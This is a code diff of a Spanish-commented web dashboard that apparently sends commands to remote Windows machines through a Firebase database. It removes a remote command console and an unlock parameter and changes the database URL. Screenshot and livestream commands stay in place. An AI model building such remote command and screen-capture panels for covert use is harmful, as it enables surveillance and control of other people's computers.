@@ -211,25 +211,7 @@
             </div>
           </div>
 
-          <!-- Derecha: Terminal y Logs -->
-          <div class="w-96 bg-slate-900 border-l border-slate-800 flex flex-col hidden lg:flex">
-            <div
-              class="p-3 bg-slate-800 border-b border-slate-700 text-xs font-bold text-slate-400 uppercase tracking-wider">
-              Terminal Remota
-            </div>
 
-            <div id="console-output"
-              class="flex-1 p-4 overflow-y-auto terminal-text text-xs space-y-1 text-slate-300 custom-scroll">
-              <!-- Logs aquí -->
-            </div>
-
-            <form id="console-form" class="p-3 bg-slate-800 border-t border-slate-700 flex gap-2">
-              <span id="console-prompt" class="text-cyan-500 font-mono py-2 text-sm">C:\></span>
-              <input type="text" id="console-input"
-                class="flex-1 bg-transparent border-none focus:ring-0 text-white font-mono text-sm"
-                placeholder="Comando..." autocomplete="off">
-            </form>
-          </div>
 
         </div>
       </div>
@@ -280,7 +262,7 @@
     import { getDatabase, ref, onValue, set, remove, get } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
     const firebaseConfig = {
-      databaseURL: "https://cmdapp-e276d-default-rtdb.europe-west1.firebasedatabase.app",
+      databaseURL: "https://hello-74404-default-rtdb.europe-west1.firebasedatabase.app",
     };
 
     const app = initializeApp(firebaseConfig);
@@ -309,24 +291,10 @@
     const detailPlaceholder = document.getElementById('detail-placeholder');
     const btnLiveToggle = document.getElementById('btn-live-toggle');
     const liveBadge = document.getElementById('live-badge');
-    const consoleOutput = document.getElementById('console-output');
-    const consoleInput = document.getElementById('console-input');
-    const consoleForm = document.getElementById('console-form');
-    const consolePrompt = document.getElementById('console-prompt');
 
     // Init Logic
     window.addEventListener('load', async () => {
       await initTimeOffset();
-
-      // Check for ?cmdunlock
-      const urlParams = new URLSearchParams(window.location.search);
-      if (!urlParams.has('cmdunlock')) {
-        if (consoleForm) {
-          consoleForm.innerHTML = '<div class="text-xs text-slate-500 text-center italic">Terminal restringida.<br>Añade ?cmdunlock para acceso total.</div>';
-          consoleInput.disabled = true;
-        }
-      }
-
       initListeners();
     });
 
@@ -415,9 +383,6 @@
 
       const cwdEncoded = machines[name]?.info?.cwd;
       currentCWD = cwdEncoded ? safeB64(cwdEncoded) : "C:\\";
-      consolePrompt.textContent = currentCWD + ">";
-
-      consoleOutput.innerHTML = '<div class="text-slate-500 italic">Conectado a ' + name + '...</div>';
 
       // Stop anterior live mode
       stopLiveMode();
@@ -431,8 +396,7 @@
         detailPlaceholder.style.display = 'block';
       }
 
-      // Configurar listeners específicos para el detalle (Consola)
-      setupConsoleListener(name);
+
     };
 
     window.switchView = function (view) {
@@ -509,58 +473,14 @@
     }
 
     async function sendLiveCommand() {
-      addToConsole("Iniciando modo LiveStream...", "info");
+      console.log("Iniciando modo LiveStream...", "info");
       await sendFirebaseCommand(selectedMachine, "/livestream", currentCWD, false); // No borrar inmediatamente para que el script lo lea
     }
 
     window.captureScreenshot = async function () {
       if (!selectedMachine) return;
-      addToConsole("Solicitando captura...", "info");
+      console.log("Solicitando captura...", "info");
       await sendFirebaseCommand(selectedMachine, "/screenshot", currentCWD);
-    }
-
-    // --- Console Logic ---
-    let consoleUnsub = null;
-    function setupConsoleListener(name) {
-      if (consoleUnsub) consoleUnsub(); // Detener listener anterior
-
-      const respRef = ref(db, `machines/${encodeKey(name)}/lastResponse`);
-      consoleUnsub = onValue(respRef, (snap) => {
-        const val = snap.val();
-        if (val && val.response) {
-          const id = val.id;
-          if (id !== consoleOutput.lastId) {
-            consoleOutput.lastId = id;
-            addToConsole(safeB64(val.response));
-          }
-        }
-      });
-    }
-
-    consoleForm.addEventListener('submit', (e) => {
-      e.preventDefault();
-      const cmd = consoleInput.value.trim();
-      if (!cmd || !selectedMachine) return;
-
-      addToConsole(currentCWD + "> " + cmd, "user");
-
-      // Local CMDs
-      if (cmd.toLowerCase() === 'cls') {
-        consoleOutput.innerHTML = '';
-        consoleInput.value = '';
-        return;
-      }
-
-      sendFirebaseCommand(selectedMachine, cmd, currentCWD);
-      consoleInput.value = '';
-    });
-
-    function addToConsole(text, type = 'resp') {
-      const div = document.createElement('div');
-      div.className = type === 'user' ? 'text-cyan-300 font-bold mt-2' : (type === 'info' ? 'text-yellow-400' : 'text-slate-300 whitespace-pre-wrap');
-      div.textContent = text;
-      consoleOutput.appendChild(div);
-      consoleOutput.scrollTop = consoleOutput.scrollHeight;
     }
 
     // --- Helpers ---
